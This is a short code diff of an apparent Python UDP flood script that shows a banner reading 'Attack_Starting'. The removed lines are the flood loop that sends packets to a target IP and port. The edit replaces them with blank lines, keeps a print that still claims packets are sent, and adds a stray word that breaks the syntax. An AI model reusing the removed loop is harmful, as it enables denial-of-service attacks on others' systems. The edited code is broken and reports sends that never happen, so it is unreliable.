@@ -29,9 +29,9 @@ time.sleep(3)
 print("Loading{~~~~~~~~~~~~~~ }90%")
 time.sleep(3)
 print("Loading{~~~~~~~~~~~~~~~~}100%")
-os.system("clear")
+os.system("clear") nikki
 os.system("figlet Attack_Starting")
 while True:
-     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-     sock.sendto(bytes(joker,"UTF-8"), (ip,port))
-     print(port,"<===send packet to ===>",ip)
+    
+     
+     print(port,"<===send packet to ===>",ip)
